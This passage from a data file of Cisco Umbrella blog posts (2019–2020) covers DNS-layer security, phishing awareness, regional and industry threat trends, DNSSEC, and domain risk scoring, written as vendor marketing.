policies and deploy them across your Meraki MR access points in minutes. Say yes to secure Wi-Fi and bye-bye to man-in-the-middle attacks, compromised public Wi-Fi, IP Spoofing, DNS cache poisoning, and more. If we can’t have a group hug, at least we can have fast, secure, reliable connectivity that keeps us safe – anywhere we access the internet. Interested in learning more about how to secure your wireless access points? Watch the webinar on-demand", "date": "2019-11-19"},
{"website": "Cisco-Umbrella", "title": "Shrinking the Cybersecurity Gender Gap with Girl Empowerment", "author": ["Negisa Taymourian"], "link": "https://umbrella.cisco.com/blog/shrinking-the-cybersecurity-gender-gap-with-girl-empowerment", "abstract": "Ever since I joined the tech industry 10+ years ago, I have had a passion for improving gender diversity in the workplace. I started my career in IT and often found myself to be the only woman in the room. While I do believe we have made significant progress over the past decade, there is still more work to be done to encourage our next generation to pursue STEM careers and to accelerate diversity in tech. I have spent years in local Bay Area classrooms encouraging young girls to explore their passion for STEM related fields. I have seen first hand how a little encouragement goes a long way. Girls need exposure to how fun and exciting careers in tech can be. And they also need exposure to strong female role models so that they can envision themselves following their footsteps one day. I am so proud to work for a company that is a huge advocate for women in tech. One of my favorite parts of working for Cisco is my Women of Cisco community in San Jose. As part of our Community Outreach pillar, we search for new ways to make an impact in our own backyard by inspiring young girls to explore tech and to learn important skills such as coding and cybersecurity. Since there is a massive shortage of cybersecurity talent we make a concerted effort to educate our youth about an expanding and dynamic field, that I personally find fun, challenging and rewarding. On November 9th, Cisco Umbrella teamed up with Women of Cisco and Men for Inclusion to host interactive cybersecurity workshops at the World Wide Women Girls’ Festival in San Francisco. It was an inspiring day full of learning, possibilities, and fun. We taught the girls practical tips on how to stay safe online: think before you click and the importance of using strong passwords and updating your software regularly. I had the treat of speaking with ABC7’s Kristen Sze and Kumasi Aaron about Cisco’s workshops and why it means so much to Cisco to take part in this special event. Watch the video: &lt;span data-mce-type=”bookmark” style=”display: inline-block; width: 0px; overflow: hidden; line-height: 0;” class=”mce_SELRES_start”>&lt;/span> Here are a couple photos from the Girls’ Festival: I also got to moderate the STEM career mentoring panel alongside women from Xilinx, Gilead, Helix and NetApp! I am on the far left. There is so much opportunity with cybersecurity and I love being able to encourage young girls to seize it!", "date": "2019-11-14"},
{"website": "Cisco-Umbrella", "title": "Consolidate Your Security in the Cloud with Cisco Umbrella", "author": ["Meg Diaz"], "link": "https://umbrella.cisco.com/blog/consolidate-your-security-in-the-cloud-with-cisco-umbrella", "abstract": "What makes a great partnership? Open communication and a passion for constant advancement are two important elements. Our customers have helped us continuously innovate, and together, we’re transforming how security is delivered. Over the past 12+ months, we embarked on a journey to take Cisco Umbrella to a new level. DNS has always been at our core — starting as a recursive DNS service (OpenDNS) in 2006, then moving into the enterprise security space in 2012 with the release of Umbrella. Enforcing security at the DNS layer was something brand new at the time. People started to see how valuable it was to have a single view of all internet activity across every location, and it was an incredibly effective way to block threats at the earliest possible point (and who doesn’t love fewer alerts to investigate!?). Add in the fact that it’s delivered from the cloud and can be deployed enterprise-wide in minutes…you can start to see the appeal it has. As we saw more applications and infrastructure move to the cloud, more people working off-network (and “forgetting” to turn on that pesky VPN), and the move to more direct internet access at remote offices, we heard more from our customers about what they needed from a security service. It wasn’t just about DNS-layer security — they often needed more. We’re excited to share that we’re now delivering more. Much more. Now, Umbrella offers secure web gateway, cloud-delivered firewall, and cloud access security broker (CASB) functionality — in addition to the DNS-layer security and threat intelligence from Investigate — all in a single, integrated cloud console. All of this is available in a new Umbrella package : Secure Internet Gateway Essentials. By unifying multiple security services in the cloud, we are now able to offer our customers greater flexibility, sharper visibility, and consistent enforcement, everywhere your users work. The goal is simple – if we can simplify your security operations and reduce complexity, then you can reduce risk and accelerate secure cloud adoption. Here are a few examples of innovations that we’re introducing as part of this: Bye security silos, hello consolidation It can be an overwhelming endeavor to help your organization transition to the cloud and secure direct internet access. It takes skill and a considerable amount of resources. How many office locations are you tasked with securing? We’ve heard loud and clear that it’s not sustainable for you to build a separate security stack in each location. By moving those core security services to a single cloud solution , you’ll be able to deploy the right level of security consistently across your organization. And you have the flexibility to deploy it as needed — you’re not forced to proxy everything or deploy in a specific way. For example, you could start with DNS for fast protection everywhere and leverage additional security services (secure web gateway, firewall, CASB, etc.) wherever you need them. “I like the simplicity of Cisco Umbrella from a management perspective, but I also enjoy the complexity of the advanced layers of protection that Cisco Umbrella provides. This one product has truly transformed our ability to protect our entire workforce, regardless of location.”– Ryan Deppe, Network Operation Supervisor, Cianbro Corporation Well-known technology, brand new approach IPSec tunnels have been around forever. But, we set out to do something different based on what we’ve heard from you. Cisco developed a new technology for IPSec tunnels that minimizes downtime and eliminates the need to build secondary tunnels with a patent-pending approach using Anycast technology for automated failover. A single IPsec tunnel can be deployed to send traffic to Umbrella from any network device, including SD-WAN. This integrated approach combined with Anycast routing can efficiently protect branch users, connected devices, and application usage from all internet breakouts with 100% business uptime. Real-time detection of DNS tunneling Even though we’ve been a leader in DNS-layer security for years, we won’t rest on our laurels. We’re watching attacker tactics and quickly adjusting ours — DNS tunneling is one example. DNS tunneling utilizes the DNS protocol to communicate non-DNS traffic (i.e. HTTP) over port 53. There are legitimate reasons why you would use DNS tunneling, but attackers have been using it for data exfiltration and command and control callbacks. To better identify and stop this, we’ve added advanced detection capabilities, real-time heuristics, signature, and encoded data detection to Umbrella. Deeper web control, retrospective alerts on malicious files Our new secure web gateway (full proxy) provides complete web traffic visibility, control, and protection — with capabilities such as content filtering at the URL-level, blocking applications or app functions, HTTPS decryption (either for select sites or all), file inspection with Cisco Advanced Malware Protection and antivirus, sandboxing unknown files with Cisco Threat Grid, and retrospective alerts on files that subsequently display malicious behavior. Think about it — file behavior can change over time or could put mechanisms in place to evade initial detection. If a file is initially determined to be safe by Threat Grid and downloaded from the web, but later is deemed to be malicious, you can now see that in Umbrella. All of these Umbrella enhancements are designed to help your organization accelerate cloud adoption with confidence — you need assurance that your users will be secure wherever they connect to the internet and that’s exactly what we’re focused on delivering for you. If you want to learn more, join our virtual launch event on November 12th and check out Jeff Reed’s blog to hear about other Cisco Security innovations.", "date": "2019-11-05"},
{"website": "Cisco-Umbrella", "title": "ABC’s of DNS", "author": ["Lorraine Bellon"], "link": "https://umbrella.cisco.com/blog/abcs-of-dns", "abstract": "Speed, security and safety through DNS The Domain Name System (DNS) serves as the foundation to Cisco Umbrella’s cloud-delivered security. It lets us connect 100 million people every day to the Internet with confidence on any device, predict malware outbreaks, and provide scalable security enforcement and threat protection to users around the globe. So how does an Internet protocol invented 36 years ago serve so many purposes? In this post, I’ll be taking an in-depth look at DNS – what it is, what makes it work, and how we use it to safely connect people to the Internet anywhere and anytime. What is DNS? DNS is the address book of the Internet. Computers identify themselves with an “Internet Protocol Address,” or an IP address. When you connect to websites, they also have an IP address. For example, the IP of the Cisco Umbrella website is 67.215.70.40. When you connect to this site, the address bar on your browser doesn’t show 67.215.79.40 – it shows umbrella.cisco.com – but if you type our IP address into your address bar, you still get to our website! In that example, umbrella.cisco.com is the domain name. Domain names were invented by early Internet researchers so that they could avoid remembering long IP addresses – instead, they created more human-friendly names, like umbrella.cisco.com. Your computer initiates about a thousand DNS queries every single day – websites, software updates, and even phone apps rely on the service. There are too many sites on the Internet for each computer to keep a complete list, so DNS servers act as an address book when computers look up domains. That’s the basic premise of DNS – when you want to connect to a website or other application server, it tells your computer which address to connect to. Whose DNS am I using? There are tens of thousands of recursive and authoritative DNS servers in the world. If you have never tinkered with DNS in the past, you probably use the recursive DNS servers of whoever provides your Internet. At your house, this may be a cable company. On your phone, it is your cellular provider. At the coffee shop down the street, it’s their Internet Service Provider. Not all DNS services are created equally. If the recursive DNS service you use breaks, you cannot connect to websites. If the DNS service you use is slow, then your connection to websites will be slow. If your DNS servers are not up-to-date, then you may not be able to connect correctly to websites. Cisco Umbrella (formerly OpenDNS) started its DNS service to provide everybody with the most reliable, safest, smartest, and fastest Internet connectivity in the world. If you want to take control of your DNS, learn how to set up protection on your personal devices . How can DNS be used to find malware? Simply put, bad things like malware, ransomware, phishing and other scams rely on DNS, so we utilize the power of machine learning to search for, identify, or even predict these malicious domains. What’s our secret sauce? Honestly, it’s you! Umbrella gathers 180 billion internet requests from over 100 million enterprise and consumer users, across 190 countries every day, at the moment a request is made — which gives us a statistically significant data set. Plus, we leverage threat intelligence from Cisco Talos, one of the largest commercial threat intelligence teams in the world with more than 300 researchers. Our real-time DNS data is also enriched with diverse public and private data feeds, giving us a unique window into the internet. We feed huge volumes of global internet activity into a combination of statistical and machine learning models to identify new attacks being staged on the internet. We use this data to predict emerging threats by analyzing how attackers leverage criminal infrastructures on the internet to launch attacks. What is the power of DNS-based security? Most companies leave their DNS resolution up to their ISP. But as more organizations adopt direct internet connections and users bypass the VPN, this leads to a DNS blind spot. DNS requests precede the IP connection, which enables DNS resolvers to log requested domains regardless of the connection’s protocol or port. Monitoring DNS requests, as well as subsequent IP connections, is an easy way to provide better accuracy and detection of compromised systems, improving security visibility and network protection. Conclusion DNS makes the Internet work. Although we rarely think about it, this quiet protocol controls our access to the Internet, making it important for our everyday security. Cisco Umbrella has been delivering reliable and safe DNS to millions of people around the world for thirteen years, with zero downtime, which is almost as incredible as DNS itself. It’s the fastest and easiest way to protect all of your users enterprise-wide in minutes. With no hardware to install and no software to manually update, ongoing management is simple. So if you’d like to see how DNS-layer security can help you, simply click this link for a free trial!", "date": "2019-10-29"},
{"website": "Cisco-Umbrella", "title": "Cyberattacks and Cybersecurity in Europe: Targets and Trends", "author": ["Kate MacLean"], "link": "https://umbrella.cisco.com/blog/targets-and-trends-to-watch-in-europe", "abstract": "To stay safe, today’s businesses must understand the types of cyberattacks they may encounter and how to implement strong cybersecurity practices. Do hackers play by the same rules across the globe? Shifting attack strategies and innovations in attack infrastructure keep security professionals like you and me employed. Read on to find out what’s keeping us up at night in Europe. The results from our Cisco Umbrella global network may surprise you. Trojans, botnets and ransomware, oh my! These threats increased tremendously in Europe over the first half of 2019, making organizations of all sizes vulnerable to attacks. What’s perhaps the most interesting is the resurgence of ransomware. Our customers see more ransomware traffic than any other geographic region. The top threats facing Europe reported drastic increases during the first half of 2019: Threats on the rise: Malware 6x Cryptomining 6x Trojans 5.4x Botnets 6.3x Ransomware 4.1x increase Phishing 5.9x Attack of the Trojans – the malicious dark horse of the Financial Services industry Financial Services attract 50% of all malicious enterprise traffic, easily making it the most vulnerable industry to cybersecurity attacks. Anyone else find this surprising? Globally, this sector is viewed as more mature than others when it comes to planning and preparing for cybersecurity incidents. How did it become the biggest target in EMEA? The answer has to be that the attackers are simply following the money! These attacks often use an unpatched vulnerability or misconfigured system in hopes of accessing larger organisations with high volumes of sensitive data. The financial services sector in EMEA experienced a sizable increase in Trojan attacks since January, with a 4.1x increase. Emotet hit Europe hard Emotet, originally a banking trojan, has morphed over the years, and remains one of the most widely distributed and actively developed malware families in the game today. Its notoriety is not stopping attackers from using it to make more money. If it worked once… it’s going to work again. And organizations in Europe are seeing how much havoc Emotet can cause in their region. From January 2019 to June 2019, the use of Emotet increased by 198%. It has been more recently used with some larger-scale targeted ransomware infections, targeting financial services. But the financial sector is not the only industry being hit. Manufacturing crippled by malicious cryptomining According the Cisco Umbrella Global Network, the manufacturing industry accounts for 15% of all malicious traffic. This industry, along with energy/utilities, has been hit the hardest by malicious cryptomining. Cryptomining, the browser or software-based threat enables bad actors to hijack system resources to generate cryptocurrencies, is quite popular in EMEA. From January 2019 to June 2019, cryptomining traffic increased 6x. It’s an easy way for bad actors to generate cash while remaining anonymous. We believe these industries remain targets because they are less likely to patch and update their software – making them more susceptible to software exploits. Local municipalities not immune to any malware Local governments and municipalities get no reprieve from hackers – they seem to grapple with more threat traffic and more diversity of attacks than any other sector. Compared to other industries, they account for almost 12% of all malicious traffic. From botnets to ransomware, dropper files to exploit kits, it seems that hackers are targeting this sector because they believe variety is the spice that keeps security professionals jumping. Reduce malware with Cisco Umbrella As cloud use increases, organizations need a way to handle the corresponding growth in the number of threats, incidents, and breaches. Leveraging threat intelligence from Cisco Talos, one of the largest commercial threat intelligence teams in the world with more than 300 researchers, Umbrella uncovers and blocks a broad spectrum of malicious domains, IPs, URLs, and files that are being used in attacks. We also feed huge volumes of global internet activity into a combination of statistical and machine learning models to identify new attacks being staged on the internet. Umbrella resolves more than 180 billion DNS requests daily, far more than any other security vendor. These insights gives our researchers a unique view of the internet to better identify trends and threats more quickly. So what are you waiting for? Take a few minutes to see what your existing security stack may be missing. With a free 14-day trial of Cisco Umbrella, you’ve got nothing to lose. Start a free trial now!", "date": "2019-10-15"},
{"website": "Cisco-Umbrella", "title": "Go Phish: Avoid Being Hooked by Phishing Emails", "author": ["Negisa Taymourian"], "link": "https://umbrella.cisco.com/blog/go-phish-avoid-being-hooked-by-phishing-emails", "abstract": "We teach kids early to go fish. And then they grow up and the word takes on a whole new meaning to us as cybersecurity professionals. But it’s still a game right? Only the stakes are higher and the players are typically older than 5. Phishing 101 Phishing is the attempt to deliver malware to a victim or to obtain sensitive information such as usernames, passwords and banking and credit card details, often for malicious purposes. Phishers usually masquerade as a trustworthy entity in an electronic communication. That’s probably why it accounts for 90% (that’s not a typo) of data breaches. The best places to phish SMBs account for the majority of phishing traffic. SLED, Financial Services and Healthcare at most targeted industries The majority of phishing activity is targeted at N. American corporations What do we see in the sea How Cisco Umbrella blocks phishing Cisco Umbrella’s phishing category leverages indicators derived from multiple sources including lexical clustering of domains, natural language processing model (identification of homograph domains) and the spike rank model, which detects sudden spikes of traffic to particular domains. In addition, our newly seen domain category is a highly effective indicator of phishing. We also leverage community resources such as phish tank feeds. Compared to other common threat types, phishing is often a more reactive threat. Our industry-renowned researchers are constantly finding new ways to uncover fingerprints that attackers leave behind and actively searching for new phishing domains and IPs to deliver stronger protection. When phishing is detected, Cisco Umbrella will block at the IP and domain level as well as analyze risky domains in the Intelligent Proxy. To catch a phish It takes three key things to effectively catch a phish: unparalleled threat intelligence: data, security researchers, and statistical and machine learning models that scour the seas for malicious activity. Members of the Cisco Umbrella research team recently shared some tricks and tips, along with their most recent phishing finds over the past three months Catch of the day, check it out here: Today’s Catch Phishing Round-up 1 and Today’s Catch Phishing Round up 2 . Get protected Umbrella resolves over 180 billion DNS requests daily, far more than any other security vendor, giving our researchers a unique view of the internet to better identify trends on threats, faster. In addition, our industry renowned researchers are constantly finding new ways to uncover fingerprints that attackers leave behind and building new statistical and machine learning models to automatically classify our massive amounts of data. Combine the power of Umbrella with Cisco Email Security for the best defense against phishing, business email compromise, and ransomware. Get threat intelligence updates every three to five minutes through Cisco Talos for the most up-to-date protection.Cisco Advanced Malware Protection protects against stealthy malware in attachments, and industry-leading URL intelligence combats malicious links. Cisco Email Security also enhances Office 365 email security. Click with caution: Phishing tips to protect you Avoid strangers, check name and email address Don’t rush, be suspicious of emails marked “urgent” Notice mistakes in spelling and grammar Beware of generic greetings, “dear sir/ma’am” Don’t be lured by incredible “deals” Hover over the link before you click to ensure it has a secure URL (https://) Never give out personal or financial information based on an email request Don’t trust links or attachments in unsolicited emails Bottom line: It only takes one wrong click for cyber-criminals to access your company’s data. So think before you click. OR minimize the risk with Cisco Umbrella and Cisco Email Security – eliminating the risk and stopping an attack before it happens. With a free 14-day trial of Cisco Umbrella, you’ve got nothing to lose. Start a free trial now!", "date": "2019-10-03"},
{"website": "Cisco-Umbrella", "title": "Midmarket Malware Mayhem: Targeted Industries and Trends to Watch", "author": ["Rachel Ackerly"], "link": "https://umbrella.cisco.com/blog/midmarket-malware-mayhem-targeted-industries-and-trends-to-watch", "abstract": "According to research from Cisco, 53% of midmarket businesses have experienced a security breach! Yet midmarket companies investigate only 55.6% of security alerts. Is 44.4 percent an acceptable blind spot? That seems like a lot of risk for companies that can’t afford a day of downtime. Adversaries view midmarket businesses as easy targets that have less sophisticated security infrastructure, and fewer trained personnel to manage and respond to threats. But before we go further, let’s define some terms. What is midmarket? If you turn to Google for the answer, you’ll get a lot of different answers. But the standard most prevailing definition by authorities seems to rely on revenue generated by the company, or asset size (number of employees) to determine market classification. Here we define midmarket as companies with 100 — 1,000 employees. So now that we’ve got our terms in order let’s dig in to the data! According to the Cisco Umbrella Global Network, midmarket companies are facing a unique set of challenges. Hackers have identified the weakness, and of course, are out to exploit it for maximum profit. You may be surprised with the list above. I know I was…. Where is retail? We’ve seen so many brick and mortar businesses dragged through the headlines. It seems like a glaring error. Don’t worry (or do worry!) Retail just missed the top 5 by 1%, coming in at 3%. We’ll talk more about shopping later! Keep reading. Manufacturing most at risk for malware Looking at our corporate Umbrella traffic, in particular, we see that manufacturing is targeted by malware 30x more than other industries. Wow. Is it because these organizations are typically slow to update software on machines for fear of downtime? Likely. Attackers love to exploit a vulnerability that is specific to an industry – not just a company. Energy companies hot targets for cryptomining Energy/utilities are targeted by cryptomining 15x more than other industries. This browser or software-based threat enables bad actors to hijack system resources to generate cryptocurrencies, and cash, while remaining anonymous. The appeal of this activity is threefold: It can be lucrative, payouts are hard if not impossible to trace, and adversaries can worry less about the potential for criminal liability for their actions. (i.e. it’s not like they’re holding a hospital hostage like their evil friend, ransomware). Adversaries can also deliver mining software (“miners”) through various methods, including email-based spam campaigns and exploit kits. Similar to manufacturing, energy/utilities organizations likely use outdated systems and software that is prone to vulnerabilities, and they can’t afford downtime or outages for security patches, leaving their refineries or coal processing plants in need of software updates. Retail rattled by rise in trojans Retail is targeted by trojans 5x more than other industries. A trojan is a harmful piece of software that looks legitimate. Users are typically tricked into loading and executing it on their systems. After it is activated, it can achieve any number of attacks on the host, from irritating the user (popping up windows or changing desktops) to damaging the host (deleting files, stealing data, or activating and spreading other malware, such as viruses). Trojans are also known to create backdoors to give malicious users access to the system, often to steal payment information. Dreaming of a silver bullet Is there a “silver bullet” to solve every cybersecurity challenge? No. And I guess we should all be grateful for that or a lot of us would be out of work… The threat landscape is too complex and changes daily. The attack surface is always expanding, and as we change how we work, where we work, and how we connect to the internet and cloud apps, our security needs to keep pace and change, too. Wake up to Cisco Umbrella As cloud use increases, organizations need a way to handle the corresponding growth in the number of threats, incidents, and breaches. Leveraging threat intelligence from Cisco Talos , one of the largest commercial threat intelligence teams in the world with more than 300 researchers, Cisco Umbrella uncovers and blocks a broad spectrum of malicious domains, IPs, URLs, and files that are being used in attacks. We also feed huge volumes of global internet activity into a combination of statistical and machine learning models to identify new attacks being staged on the internet. Umbrella resolves more than 180 billion DNS requests daily, far more than any other security vendor. This unique insights gives our researchers a unique view of the internet to better identify trends on threats, faster. So what are you waiting for? Take a few minutes to see what your existing security stack may be missing. With a free 14-day trial of Cisco Umbrella, you’ve got nothing to lose. Start a free trial now! Takeaway: Top 5 most targeted midmarket companies by hackers: 16% Manufacturing 14% SLED 8% Financial Services 8% Professional Services 4% Energy/Utilities", "date": "2019-09-26"},
{"website": "Cisco-Umbrella", "title": "How DNS-Layer Security Can Improve Cloud Workloads", "author": ["Prem V"], "link": "https://umbrella.cisco.com/blog/how-dns-layer-security-can-improve-cloud-workloads", "abstract": "More organizations are adopting the public cloud for their enterprise workloads. Gartner has forecasted 1 that by 2020, less than 5% of enterprise workloads will be running in true on-premises private clouds. As workloads move to public clouds, it is crucial that security architectures evolve to protect those workloads, wherever they are. Like with on-premises applications, a layered security approach works better than point solutions for cloud workloads. But the security challenges in the cloud are different. Without a physical data center in which you build your security stack to  protect your data, it’s difficult to know if you’re fully protected everywhere your enterprise data is exposed. That’s where DNS-layer security comes in. Since DNS is built into the foundation of the Internet, security at the DNS-layer can be simple to deploy and highly effective, whether  your enterprise uses on-premises architecture or the public cloud. Cisco Umbrella provides DNS-based security that blocks requests to malware, phishing, and botnets before a connection is even established. It can prevent cloud workloads from being leveraged for malicious cryptomining by blocking requests to suspicious domains. Content category blocking can also be configured to prevent cloud workloads from being used by  employees to circumvent on-premises content filtering rules. One of the simplest approaches to enable DNS-based security for cloud-native workloads is to point the DNS server used by these workloads to Cisco Umbrella. This enables  DNS-level blocking of malicious domains and provides an added layer of security. However, since most cloud workloads tend to access the Internet through an ephemeral public IP address, it is difficult to define policy or to view reporting of DNS activity in the public cloud. Another approach is to deploy the Cisco Umbrella Virtual Appliance in a Virtual Private Cloud (VPC) in the public cloud. Workloads in that VPC can use the Virtual Appliance as  their DNS server. The Virtual Appliance forwards DNS requests for  external domains to Umbrella and includes the source IP of the requesting workload in the DNS metadata. Virtual Appliances include a customer identifier in each outgoing DNS request, which enables them to be used for environments with ephemeral public IP addresses. With the  Virtual Appliance approach, subnet-based content filtering policies can be defined for cloud workloads. Umbrella can also provide visibility into the source of malicious domain requests, allowing administrators to quickly remediate these workloads. The Cisco Umbrella Virtual Appliance now supports deployment in the three major public cloud platforms: Amazon Web Services (AWS), Microsoft Azure, and Google Cloud Platform (GCP). With many organizations now adopting a multi-cloud strategy 2 , deploying Umbrella Virtual Appliances in the respective public cloud VPCs can provide a highly effective added layer of security for workloads deployed in any of these platforms, as well as improved visibility into activity. What are you waiting for? Sign up for a free trial of Cisco Umbrella , and start leveraging the power of DNS-layer security to protect your cloud workloads. Modernize IT infrastructure in a hybrid world, Gartner, Mar 2019. Retrieved from https://www.gartner.com/smarterwithgartner/modernize-it-infrastructure-in-a-hybrid-world/ Why organizations choose a Multicloud strategy, Gartner, May 2019. Retrieved from https://www.gartner.com/smarterwithgartner/why-organizations-choose-a-multicloud-strategy/", "date": "2020-01-23"},
{"website": "Cisco-Umbrella", "title": "What is DNSSEC and Why Is It Important?", "author": ["Robbie Grue"], "link": "https://umbrella.cisco.com/blog/what-is-dnssec-and-why-is-it-important", "abstract": "If you’re like most companies, you probably leave your DNS resolution up to your ISP. But as employees bypass the VPN, and even more organizations adopt direct internet access, it’s more than likely that you have a DNS blind spot. So what steps can you take to ensure your visibility remains free and clear? One simple and easy thing you can start doing right away is to mine your DNS data. Each time a browser contacts a domain name, it has to contact the DNS server first. Since DNS requests precede the IP connection, DNS resolvers log requested domains regardless of the connection’s protocol or port. That’s an information gold mine! Just by monitoring DNS requests and subsequent IP connections you will eliminate the blind spot and easily gain better accuracy and detection of compromised systems and improve your security visibility and network protection. But what about those pesky cache poisoning attacks, also known as DNS spoofing? DNS cache poisoning attacks locate and then exploit vulnerabilities that exist in the DNS, in order to draw organic traffic away from a legitimate server toward a fake one.This type of attack is dangerous because the client an be redirected, and since the attack is on the DNS server, it will impact a very large number of users. Back in the early nineties, the era of the world-wide-web, Sony Discmans and beepers (we’ve come a long way kids!), the Internet Engineering Task Force , or  IETF started thinking about ways to make DNS more secure. The task force proposed ways to harden DNS and in 2005, Domain Name System Security Extensions, aka DNSSEC, was formally introduced. DNS Security Extensions, better known as DNSSEC, is a technology that was developed to, among other things, protect against [cache poisoning] attacks by digitally ‘signing’ data so you can be assured [the DNS answer] is valid. DNSSEC uses cryptographic signatures similar to using GPG to sign an email; it proves both the validity of the answer and the identity of the signer. Special records are published in the DNS allowing recursive resolvers or clients to validate signatures. There is no central certificate authority, instead parent zones provide certificate hash information in the delegation allowing for proof of validity. Cisco Umbrella now supports DNSSEC by performing validation on queries sent from Umbrella resolvers to upstream authorities. Customers can have the confidence that Cisco Umbrella is protecting their organization from cache poisoning attacks, without having to perform validation locally. Cisco Umbrella delivers the best, most reliable, and fastest internet experience to every single one of our more than 100 million users. We are the leading provider of network security and DNS services, enabling the world to connect to the internet with confidence on any device. Get the details on how Cisco Umbrella supports DNSSEC .", "date": "2020-01-28"},
{"website": "Cisco-Umbrella", "title": "Easily Determine Risk Factors for a Domain With Cisco Umbrella Investigate", "author": ["David Rodriguez"], "link": "https://umbrella.cisco.com/blog/easily-determine-risk-factors-for-a-domain-with-cisco-umbrella-investigate", "abstract": "Recently we have been hearing from SOC analysts and researchers that they have been struggling to evaluate the riskiness of domains seen in their environments. Regardless of vertical, we have heard a common theme loud and clear: there is a need to simplify risk indicators to enable security professionals to make better decisions. As researchers at Cisco Umbrella, we are always looking for ways to summarize and simplify the most essential information for our customers. We browse through hundreds of DNS logs daily and we see first hand the threats that organizations face. When it comes to attacks we know that time is of the essence and that’s why we are really excited to announce Cisco Umbrella Investigate’s new and improved risk score. Now analysts can get the context needed to understand what factors contribute to the domain’s score resulting in deeper visibility, faster triage and better decision making. As a cloud security solution with a global presence and rich threat intelligence , we’ve gleaned insights and consolidated them into building blocks that will assist a research analyst, SOC team, or anyone trying to quickly determine risk factors for a particular domain. How we identify risky domains As researchers, we are constantly keeping tabs on the latest threats in ransomware, malvertising, and many other threats our customers face. And while threats constantly change, some methods used by attackers are automated and reused. This is a good thing because it makes it easier for us to pick up these patterns. For example, when writing some of our in-house algorithms to detect phishing domains we see threat actors returning to common themes. We look at the lexical structure of a domain name and ask: “are there any major brand names being spoofed” or “does the domain contain click-bait catchphrases, is this a scam, spam?” Other times, we want to know if the domain has any lexical structures similar to known malicious domain names that we’ve seen in the past (regardless of keywords or language). But the lexical characteristics of a domain name only gets you so far. So sometimes we want to include behavioral components such as, how much traffic a particular site is getting and how it compares to other abused domain names. From there, we can assess: “is this the same number of requests, from the same region, to a compromised website?” And given that every domain has a top level domain (TLD) we can also compare the reputation of a domain across different TLDs to identify abuse. As researchers, we have found that the new components of the risk score help answer these types of critical questions within a matter of seconds. Introducing the new and improved Investigate risk score Let’s take a look at the new risk score enhancements. As you can see in the top left of the image below, the Investigate risk score is synthesized into one overall score much like a credit score. Just as a credit score includes subscores such as account balances, lending history, debt ratios, and other components the Investigate risk score now includes several new subscores as well. These new subscores include an emphasis on the lexical characteristics of domain names along with some key behavioral components. Below the Investigate risk score is a small drop-down widget that can be expanded once clicked. Users that want to dig deeper can do so by expanding the subscores widget. Each score is normalized between 0 and 100, with 100 indicating the highest risk. Since each subscore conveys something unique, our research team has identified score values that represent low, medium, or high risk. For example, a geo popularity subscore greater than 80 is known as high risk. Similar thresholds have been defined for each subscore. Now let’s take a closer look at each of these subscores. Geo popularity subscore With our global data centers, we have unparalleled visibility into DNS requests made by clients around the world. For example, we are able to analyze: is a domain getting requests from a country where it typically doesn’t? Did the number of countries requesting a domain suddenly change? Is this domain part of a geographically targeted attack? By analyzing requests to domains across all countries in the world, patterns emerge that allow us to detect anomalous behavior and identify increased risk. By looking at popularity per country, we can get more context: for example, the CBC is popular in Canada but not Germany, and the BBC is popular in the UK but not Morocco. Neither of these facts is terribly surprising, but in some situations monitoring this type of behavior can indicate malicious activity. For example, as the visual above demonstrates we may see a US based domain with a sudden spike of unusually high traffic from Eastern Europe. This could be an indicator of risky activity. We have also seen this model unveil targeted attacks such as DNS tunneling. Keyword subscore Many phishing attacks still try to take advantage of the weakest link in the security chain: people. If a domain name contains words related to legitimate companies and services, it is more likely that people will be tricked into clicking. This style of social engineering continues to be a common technique of attackers, and we have built a model around detecting when domains are pretending to be something they are not. Similar to spam scanners looking for keywords such as “click here” or “account suspended” – we have taken some of these algorithms and used these types of ideas in the keyword subscore. This subscore was inspired while we were looking through the data being generated by our newly seen domains system and observing that many domains that are clearly phishing were going undetected. Naively, we could identify these threats by adding patterns to detection lists, but this quickly becomes a maintenance nightmare. Instead, we treat the domain name like the text of an email, and use a modified spam engine to detect the phish. Lexical subscore A mainstay of communication between infected machines and command and control servers are domains created using domain generation algorithms (DGAs). DGAs avoid the need to embed the location of control servers directly in the malware, and enable the attackers to regain control of their botnets even in the face of sinkholing and takedowns. Using a generalization of the method behind the Cisco Umbrella DGA score, we can now more reliably predict when hostnames were generated in this fashion, without having to rely on the usual laborious methods of teaching the models what lexical patterns to look for. Surprisingly, the idea for this subscore came from image recognition, which has recently been making incredible progress. Computers can learn to identify objects, regardless of where they appear in a picture, or which way they’re pointing.  Similarly, we used a deep learning model to learn how to distinguish malicious domain names based on the presence or absence of specific character combinations, regardless of where or how they appear in the domain name. By curating over a million domains to train the model, we now reach into that memory to perform real-time searches for lexical clues indicating risk. Top Level Domain (TLD) subscore Not all top level domains are created equal. Over the years, the TLDs of choice for spammers and other criminals have changed according to factors such as cost, ease of batch registration, verification of registrant identity, and abuse complaint policies. For example, we are all familiar with common domain names like cisco.com. But what about cisco.info? Or cisco.icu? While subtle, the reputation of each domain variation hinges on the TLD. From a sample of global traffic we can distinguish active TLDs (with many unique domains) and tease out those TLDs with the most abuse. With insight into TLD popularity, this score can determine what proportion of abuse is severe, adding a rich behavioral aspect to our TLD score that is unique to Cisco Umbrella customers. Learn more Interested in checking out our enhanced Risk Score capability? Contact us today for a demo or free trial for Cisco Umbrella Investigate. If you are currently an Investigate customer, you already have access to our enhanced Risk Score and the new subscore indicators.", "date": "2020-01-30"},
{"website": "Cisco-Umbrella", "title": "Top 10 reasons why 20,000+ businesses point their DNS to Cisco Umbrella", "author": ["Robbie Grue"], "link": "https://umbrella.cisco.com/blog/top-10-reasons-why-20000-businesses-point-their-dns-to-cisco-umbrella", "abstract": "At Cisco Umbrella, we are obsessed with inventing new technologies to secure users everywhere, speed up the internet, and move the state of the art for the Domain Name System (DNS) forward. The Cisco Umbrella global network handles 200+ billion DNS requests daily — with 100% business uptime since 2006. But that’s not all. Check out 10 good reasons to point your DNS to Cisco Umbrella 1. Better visibility to see internet activity All internet activity is logged and categorized in real time using 85+ domain content categories. With our easy-to-use web interface, it’s simple to input your networks’ IP addresses and search, filter, export, or log this internet activity globally or per-network for 30 days. 2. Unmatched threat intelligence to block malware Leveraging threat intelligence from Cisco Talos, one of the largest commercial threat intelligence teams in the world, Umbrella uncovers and blocks a broad spectrum of malicious domains, IPs, URLs, and files that are being used in attacks. We also feed huge volumes of global internet activity into a combination of statistical and machine learning models to identify new attacks being staged on the internet. 3. Highly scalable, automated defenses to keep your data safe We have your back by implementing and innovating best-in-class DNS practices — from blocking or rate-limiting requests with unusual record types, excessive duplicate queries, excessive DNS records, or those sent from malicious client IPs, to adding entropy to our name server requests. We help shield infrastructure from malware, ransomware, malicious cryptomining, and C2 callbacks. 4. Hardened DNS resolver code reduces risk of exploits Umbrella servers run a 